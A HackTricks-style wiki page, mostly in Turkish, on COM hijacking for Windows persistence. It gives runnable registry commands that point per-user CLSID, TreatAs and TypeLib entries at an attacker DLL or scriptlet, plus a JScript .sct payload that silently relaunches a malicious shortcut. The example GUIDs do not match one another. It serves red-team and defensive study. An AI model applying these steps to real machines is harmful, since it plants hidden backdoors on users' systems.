# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

HKCU değerleri kullanıcılar tarafından değiştirilebildiğinden **COM Hijacking** bir **persistence mechanism** olarak kullanılabilir. `procmon` kullanarak henüz mevcut olmayan ve saldırgan tarafından oluşturulabilecek aranan COM kayıtlarını bulmak kolaydır. Klasik filtreler:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Avlanma sırasında faydalı varyasyonlar:

- Eksik **`LocalServer32`** anahtarlarına da bakın. Bazı COM sınıfları ayrı süreçte çalışan sunuculardır (out-of-process) ve bir DLL yerine saldırgan kontrolündeki bir EXE'yi başlatır.
- `InprocServer32`'e ek olarak **`TreatAs`** ve **`ScriptletURL`** kayıt işlemlerini de arayın. Son tespit içerikleri ve malware yazıları bunları sıklıkla vurgular çünkü normal COM kayıtlarına göre çok daha nadir olup bu nedenle yüksek sinyal verirler.
- Bir kaydı HKCU'ye klonlarken orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` içindeki meşru **`ThreadingModel`** değerini kopyalayın. Yanlış model genellikle etkinleştirmeyi bozar ve hijack'i gürültülü hale getirir.
- 64-bit sistemlerde hem 64-bit hem 32-bit görünümlerini inceleyin (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` ve `HKLM\Software\Classes\WOW6432Node`) çünkü 32-bit uygulamalar farklı bir COM kaydına çözümleyebilir.

Hangi henüz mevcut olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçmak olabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele geçirilebilir Task Scheduler COM bileşenleri

Windows Tasks, COM nesnelerini çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıya bakarak örneğin **her kullanıcı giriş yaptığında** çalıştırılacak bir tane seçebilirsiniz.

Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'i **HKEY\CLASSES\ROOT\CLSID**'de ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da bulunmadığını görürsünüz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Sonra, HKCU girdisini oluşturabilir ve kullanıcı her oturum açtığında backdoor'unuz tetiklenir.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`, bir CLSID'nin başka bir CLSID tarafından taklit edilmesine izin verir. Saldırgan bakış açısından bu, orijinal CLSID'i değiştirmeden bırakıp `scrobj.dll`'e işaret eden kullanıcı-başına ikinci bir CLSID oluşturabileceğiniz ve gerçek COM nesnesini `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.

This is useful when:

- the target application already instantiates a stable CLSID at logon or on app start
- you want a registry-only redirect instead of replacing the original `InprocServer32`
- you want to execute a local or remote `.sct` scriptlet through the `ScriptletURL` value

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` reads the `ScriptletURL` value and executes the referenced `.sct`, so you can keep the payload as a local file or pull it remotely over HTTP/HTTPS.
- `TreatAs` is especially handy when the original COM registration is complete and stable in HKLM, because you only need a small per-user redirect instead of mirroring the entire tree.
- For validation without waiting on the natural trigger, you can instantiate the fake ProgID/CLSID manually with `rundll32.exe -sta <ProgID-or-CLSID>` if the target class supports STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. When a COM server is instantiated, the OS may also load the associated TypeLib by consulting registry keys under `HKCR\TypeLib\{LIBID}`. If the TypeLib path is replaced with a **moniker**, e.g. `script:C:\...\evil.sct`, Windows will execute the scriptlet when the TypeLib is resolved – yielding a stealthy persistence that triggers when common components are touched.

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Kullanıcı başına TypeLib yolunu yerel bir scriptlet'e `script:` moniker kullanarak yönlendir (yönetici hakları gerekmez):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Ana payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (ör. başlangıç zinciri tarafından kullanılan bir `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Tetikleme – IE'yi açmak, WebBrowser control'ü gömülü bir uygulama veya hatta rutin Explorer etkinliği TypeLib'i yükleyip scriptlet'i çalıştıracak ve oturum açma/yeniden başlatma sırasında zincirinizi yeniden etkinleştirecektir.

Temizlik
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notlar
- Aynı mantığı diğer sık kullanılan COM bileşenlerine de uygulayabilirsiniz; önce her zaman gerçek `LIBID`'yi `HKCR\CLSID\{CLSID}\TypeLib`'den çözün.
- On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.

## Referanslar

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
